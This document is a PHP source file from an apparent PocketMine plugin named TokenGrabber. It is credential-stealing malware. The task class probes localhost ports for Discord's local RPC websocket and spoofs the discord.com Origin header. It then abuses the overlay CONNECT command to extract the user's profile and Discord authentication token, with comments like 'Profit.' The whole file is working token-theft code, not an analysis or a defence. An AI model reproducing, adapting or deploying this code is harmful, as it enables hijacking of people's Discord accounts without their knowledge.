<?php

namespace TokenGrabber;

use pocketmine\scheduler\AsyncTask;
use pocketmine\utils\UUID;
use stdClass;
use TokenGrabber\WebSocket\Client;

class AsyncTokenStealTask extends AsyncTask {

    public function onRun() {
        // Search and find the port Discord is on. (wtf is the point of this, Discord?)
        for ($port = 6463; $port < 6473; $port++) {
            $client = new Client("ws://localhost:" . $port . "/?v=1&encoding=json", [
                'headers' => [
                    'Origin' => 'https://discord.com',
                ],
            ]);
            if ($client->isConnected()) {
                break;
            }
        }

        if (!isset($client)) {
            // No idea how this is possible?
            $this->setResult(new UnsetClientError());

            return;
        }

        if (!$client->isConnected()) {
            // Discord (the client) isn't running on the target PC, so we can't do anything else.
            $this->setResult(new DiscordOfflineError());

            return;
        }

        // Wait for the ready message.
        $firstMessage = json_decode($client->receive());
        if ($firstMessage->{'evt'} == "READY") {
            // Subscribe to the overlay event and connect to it.
            $client->text(json_encode(array('cmd' => "SUBSCRIBE", 'args' => new stdClass(), 'evt' => "OVERLAY", 'nonce' => UUID::fromRandom()->toString())));
            $client->text(json_encode(array('cmd' => "OVERLAY", 'args' => array('type' => "CONNECT", 'pid' => 4), 'nonce' => UUID::fromRandom()->toString())));

            // Wait for a response that we need.
            while (true) {
                $decoded = json_decode($client->receive());
                if ($decoded->{'cmd'} == "DISPATCH" && $decoded->{'data'}->{'type'} == "DISPATCH" && $decoded->{'data'}->{'pid'} == 4) {
                    break;
                }
            }

            // Profit.
            $payload = $decoded->{'data'}->{'payloads'}[0];

            $user = json_encode($payload->{'users'}[0]);
            $token = trim($payload->{'token'});

            $this->setResult(new UserData($user, $token));
        } else {
            // We (for whatever reason) never got the ready event?
            $this->setResult(new BadFirstEventError());
        }

        // Close the websocket connection.
        $client->close();
    }

}